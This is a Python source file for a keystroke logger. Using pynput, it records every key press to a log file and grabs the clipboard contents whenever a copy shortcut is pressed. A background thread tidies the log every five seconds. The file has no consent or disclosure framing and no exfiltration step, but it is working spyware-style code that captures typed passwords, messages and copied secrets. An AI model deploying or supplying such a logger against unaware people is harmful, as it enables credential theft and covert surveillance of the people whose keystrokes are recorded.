from pynput.keyboard import Key, Listener, KeyCode
import threading
import os
import time
import pyperclip

from text_cleaner import clean_log_content

pressed_keys = set()
log_file_getter = None

def set_log_file_getter(getter_func):
    """Set the function to get current log file path"""
    global log_file_getter
    log_file_getter = getter_func

def write_to_file(key):
    global pressed_keys, log_file_getter

    pressed_keys.add(key)

    key_str = str(key).replace("'", "")
    key_str = key_str.replace("Key.space", " spacebar ")
    key_str = key_str.replace("Key.enter", " enterPressed\n")
    key_str = key_str.replace("Key.backspace", " backspaceKey ")
    key_str = key_str.replace("Key.shift", " shiftPressedKey ")
    key_str = key_str.replace("Key.ctrl", " ctrlKey+ ")
    key_str = key_str.replace("Key.cmd", " cmdKey ")
    key_str = key_str.replace("Key.tab", " tabKey ")
    key_str = key_str.replace("Key.right", " rightKey ")
    key_str = key_str.replace("Key.left", " leftKey ")
    key_str = key_str.replace("Key.up", " upKey ")
    key_str = key_str.replace("Key.down", " downKey ")

    log_file = log_file_getter() if log_file_getter else "log.txt"

    if ((Key.ctrl in pressed_keys and key == KeyCode.from_char('c')) or
        (Key.cmd in pressed_keys and key == KeyCode.from_char('c'))):
        time.sleep(0.1)
        try:
            clipboard_content = pyperclip.paste()
            with open(log_file, "a", encoding="utf-8") as f:
                f.write("\n[CLIPBOARD] " + clipboard_content + "\n")
        except Exception as e:
            print("Error reading clipboard:", e)

    with open(log_file, "a", encoding="utf-8") as f:
        f.write(key_str)

    if key == Key.esc:
        return False

def on_release(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

def periodic_cleaner():
    """Clean spacebar text from log file every 5 seconds"""
    while True:
        if not os.path.exists(__file__):
            print("Script file deleted, stopping cleaner.")
            break

        log_file = log_file_getter() if log_file_getter else "log.txt"
        
        if log_file and os.path.exists(log_file):
            try:
                with open(log_file, "r", encoding="utf-8") as file:
                    content = file.read()

                cleaned_content = clean_log_content(content)

                with open(log_file, "w", encoding="utf-8") as file:
                    file.write(cleaned_content)
            except Exception as e:
                print(f"Error in periodic_cleaner: {e}")

        time.sleep(5)
